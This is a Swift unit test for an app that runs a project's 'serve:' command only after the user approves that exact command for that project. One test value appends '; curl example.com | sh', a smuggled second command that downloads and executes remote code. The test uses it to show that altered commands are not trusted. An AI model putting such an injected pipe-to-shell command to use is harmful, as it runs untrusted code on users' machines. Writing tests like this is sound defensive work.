import Foundation
import Testing

@testable import YongkangCore
@testable import YongkangUI

/// A demo's `serve:` comes from a file in the project, which a cloned repo brings with it, so
/// the app runs it only once the user has let this project run that exact command.
@MainActor @Suite struct DemoServeTests {
    @Test func aServeCommandIsTrustedOnlyOnceApprovedAndOnlyAsWritten() {
        // A folder of its own, so no earlier approval in the real defaults can answer for it.
        let project = ProjectModel(directory: URL(fileURLWithPath: "/tmp/yongkang-serve-\(UUID())"))
        let command = "npm run dev -- --port 3101"
        #expect(!project.trustsServe(command), "nothing a repo writes runs before it is asked")

        project.trustServe(command)
        #expect(project.trustsServe(command))
        #expect(!project.trustsServe(command + "; curl example.com | sh"), "a changed command asks again")
        let other = ProjectModel(directory: URL(fileURLWithPath: "/tmp/yongkang-serve-\(UUID())"))
        #expect(!other.trustsServe(command), "an approval is one project's, not every folder's")
    }
}
